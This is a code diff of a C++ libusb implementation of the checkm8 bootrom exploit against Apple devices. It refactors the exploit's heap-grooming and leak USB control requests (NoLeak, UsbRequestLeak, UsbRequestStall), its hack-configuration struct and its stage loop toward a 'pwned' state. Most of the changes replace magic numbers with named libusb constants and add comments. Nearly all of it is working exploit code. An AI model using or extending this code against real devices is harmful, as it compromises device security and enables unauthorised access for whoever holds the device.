@@ -19,7 +19,7 @@ enum class Stage : int32_t
 	kPwned
 };
 
-static const char *pwnd_str = " PWND:[gaster]";
+static const char *pwnd_str = " PWND:[";
 
 namespace LibUsb
 {
@@ -80,7 +80,7 @@ namespace LibUsb
 	struct HackConfig 
 	{
 		uint16_t	m_cpid;	
-		uint8_t		m_pad[2];
+		uint8_t		m_pad[6];
 		size_t		m_cfgHole;
 		size_t		m_cfgLargeLeak;							
 		size_t		m_cfgOverwritePad;						
@@ -255,7 +255,9 @@ namespace LibUsb
 			bool hasAlreadyBeenPwn3d = false;
 			bool bAlreadyBeenFound = false;
 			Stage stage = Stage::kReset;
-			while (stage != Stage::kPwned && WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound) )
+		//	while (stage != Stage::kPwned && WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound) )
+			WaitForUsb(&desc, 0, 0, hasAlreadyBeenPwn3d, bAlreadyBeenFound);
+			while (stage != Stage::kPwned )
 			{
 				if (hasAlreadyBeenPwn3d == false)
 				{
@@ -350,7 +352,7 @@ namespace LibUsb
 			{
 				return 0;
 			}
-			for (int i = 0; i < g_hackConfig.m_cfgHole; ++i)
+			for (int i = 0; i < g_hackConfig.m_cfgHole; i++)
 			{
 				if (!Checkm8::NoLeak(pDesc))
 				{
@@ -368,7 +370,7 @@ namespace LibUsb
 			{
 				return 0;
 			}
-			for (int i = 0; i < g_hackConfig.m_cfgLargeLeak; ++i)
+			for (int i = 0; i < g_hackConfig.m_cfgLargeLeak; i++)
 			{
 				if (!Checkm8::UsbRequestLeak(pDesc))
 				{
@@ -485,7 +487,7 @@ namespace LibUsb
 		}
 		return ret;
 	}
-
+	//sync request
 	int SendControlRequest(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, void* pData, uint16_t wLength, TransferDesc* pTd)
 	{
 		//Perform a USB control transfer.
@@ -508,7 +510,7 @@ namespace LibUsb
 		}
 		return 1;
 	}
-
+	//sync request with empty data
 	int SendControlRequestWnoData(UsbDesc* pDesc, uint8_t reqType, uint8_t bRequest, uint16_t wValue, uint16_t wIndex, uint16_t wLength, TransferDesc* pTd)
 	{
 		int ret = 0;
@@ -537,12 +539,11 @@ namespace Checkm8
 	{
 		unsigned usb_abort_timeout = 0;
 		LibUsb::TransferDesc transferDesc;
-		//wIndex					 //wLength
 		uint16_t wLength = 3 * EP0_MAX_PACKET_SZ;
-		while (SendControlRequestAsyncWnoData(pDesc, 0x80, 6, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, wLength, usb_abort_timeout, &transferDesc))
+		while (SendControlRequestAsyncWnoData(pDesc, LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE, LIBUSB_REQUEST_GET_DESCRIPTOR, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, wLength, usb_abort_timeout, &transferDesc))
 		{
 			if (transferDesc.m_sz < wLength 
-				&& SendControlRequestAsyncWnoData(pDesc, 0x80, 6, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transferDesc) 
+				&& SendControlRequestAsyncWnoData(pDesc, LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE, LIBUSB_REQUEST_GET_DESCRIPTOR, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transferDesc)
 				&& transferDesc.m_sz == 0)
 			{
 				return true;
@@ -556,14 +557,30 @@ namespace Checkm8
 	{
 		LibUsb::TransferDesc transferDesc;
 		uint16_t wLength = 3 * EP0_MAX_PACKET_SZ + 1;
-		return LibUsb::SendControlRequestAsyncWnoData(pDesc, 0x80, 6, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, wLength, 1, &transferDesc) && transferDesc.m_sz == 0;
+		return LibUsb::SendControlRequestAsyncWnoData(
+			pDesc, 
+			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,
+			LIBUSB_REQUEST_GET_DESCRIPTOR,
+			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, 
+			USB_MAX_STRING_DESCRIPTOR_IDX, 
+			wLength, 
+			1, 
+			&transferDesc) && transferDesc.m_sz == 0;
 	}
 
 	int UsbRequestLeak(LibUsb::UsbDesc* pDesc)
 	{
 		LibUsb::TransferDesc tDesc;
 
-		return LibUsb::SendControlRequestAsyncWnoData(pDesc, 0x80, 6, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &tDesc) && tDesc.m_sz == 0;
+		return LibUsb::SendControlRequestAsyncWnoData(
+			pDesc, 
+			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,	//requestType
+			LIBUSB_REQUEST_GET_DESCRIPTOR,													//bRequest
+			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, 
+			USB_MAX_STRING_DESCRIPTOR_IDX,													//wIndex
+			EP0_MAX_PACKET_SZ,																//wLength
+			1,																				//abortTimeout
+			&tDesc) && tDesc.m_sz == 0;
 
 	}
 
@@ -571,14 +588,29 @@ namespace Checkm8
 	{
 		LibUsb::TransferDesc tDesc;
 
-		return SendControlRequestAsyncWnoData(pDesc, 0x80, 6, (3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ + 1, 1, &tDesc) && tDesc.m_sz == 0;
-
+		return SendControlRequestAsyncWnoData(
+			pDesc,
+			LIBUSB_ENDPOINT_IN | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_DEVICE,	//requestType
+			LIBUSB_REQUEST_GET_DESCRIPTOR,													//bRequest
+			(3U << 8U) | LibUsb::g_usbDeviceDescriptor.m_iSerialNumber,
+			USB_MAX_STRING_DESCRIPTOR_IDX,													//wIndex
+			EP0_MAX_PACKET_SZ + 1,															//wLength
+			1,																				//abortTimeout
+			&tDesc) && tDesc.m_sz == 0;
 	}
 
 	int UsbRequestStall(LibUsb::UsbDesc* pDesc)
 	{
 		LibUsb::TransferDesc tDesc;
-
-		return SendControlRequestWnoData(pDesc, 2, 3, 0, 0x80, 0, &tDesc) && tDesc.m_result == LIBUSB_TRANSFER_STALL;
+		//Synchronous request	
+		return SendControlRequestWnoData(
+			pDesc,  
+			LIBUSB_ENDPOINT_OUT | LIBUSB_REQUEST_TYPE_STANDARD | LIBUSB_RECIPIENT_ENDPOINT,	//requestType
+			LIBUSB_REQUEST_SET_FEATURE,														//bRequest
+			0,																				//wValue
+			0x80,																			//wIndex
+			0,																				//wLength
+			&tDesc) 
+			&& tDesc.m_result == LIBUSB_TRANSFER_STALL;
 	}
 }
